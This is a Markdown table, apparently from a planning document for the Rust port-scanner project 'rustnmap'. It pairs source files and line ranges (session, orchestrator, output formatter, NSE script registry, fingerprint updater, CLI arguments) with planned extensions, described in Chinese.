| `crates/rustnmap-core/src/session.rs` | 130 | `OutputSink` trait | 实现流式输出 |
| `crates/rustnmap-core/src/session.rs` | 231-251 | `ScanType` 枚举 (12 变体) | 插件系统扩展 |
| `crates/rustnmap-core/src/session.rs` | 695-706 | `ResumeStore` 空 stub | 实现完整暂停/恢复 |
| `crates/rustnmap-core/src/session.rs` | 792 | `DefaultOutputSink` 空实现 | 接入格式化器 |
| `crates/rustnmap-core/src/orchestrator.rs` | 29-46 | `ScanPhase` 枚举 (8 阶段) | 两阶段自适应扫描 |
| `crates/rustnmap-output/src/formatter.rs` | 54-72 | `OutputFormatter` trait | 新增 HTML/SARIF/OCSF/Markdown |
| `crates/rustnmap-nse/src/registry.rs` | 17-33 | `ScriptDatabase` 索引结构 | 远程仓库、智能推荐 |
| `crates/rustnmap-nse/src/engine.rs` | 43 | `ScriptScheduler` 并发控制 | AI 脚本推荐集成 |
| `crates/rustnmap-fingerprint/src/database/updater.rs` | 33-35 | Nmap SVN URL 常量 | 扩展为通用资源更新框架 |
| `crates/rustnmap-cli/src/args.rs` | 59-70 | `Args` 结构体 (60+ 选项) | 新增 --tui/--stream/--vuln/--ai 等选项 |
